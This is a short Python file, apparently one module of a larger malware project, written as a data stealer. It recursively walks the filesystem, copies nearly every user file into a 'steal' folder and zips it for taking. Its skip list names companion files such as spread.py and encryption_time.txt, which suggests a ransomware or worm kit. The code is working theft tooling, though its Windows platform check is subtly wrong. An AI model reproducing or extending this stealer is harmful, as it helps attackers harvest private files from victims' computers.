#Author: SergioZ3R0
#region Imports
import os
import sys
import zipfile
import shutil
#endregion
#region Definitions
files = [] # List to store the files in the current directory
def recorrer_arbol_directorios(directory):
    global files
    importantF = ["darthvader.py", "skywalker.py", "logo.png", "spread.py", "time_remaining.txt", "window(no usage).py", "stealer.py", "auto_run", "encryption_time.txt","READMEPLS.txt" , "README.md", "auto_run.py", "steal.zip"]
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    if file.endswith('.py') or file.endswith(".deb") or file.endswith(".exe") or file in importantF:
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except Exception as e:
        pass
    print(files)

def comprimir_archivos(nombre_archivo_zip, archivos_a_comprimir):
    with zipfile.ZipFile(nombre_archivo_zip, 'w') as archivo_zip:
        for archivo in archivos_a_comprimir:
            archivo_zip.write(archivo)

def stealer(files):
    if os.path.exists("steal"):
        pass
    else:
        os.mkdir("steal")
    for file in files:
        shutil.copy(file, "steal/")
        if file == files[-1]:
            comprimir_archivos("./steal.zip", files)
#endregion
if sys.platform == "windows":
    recorrer_arbol_directorios("\\")
else:
    recorrer_arbol_directorios("./")
stealer(files)

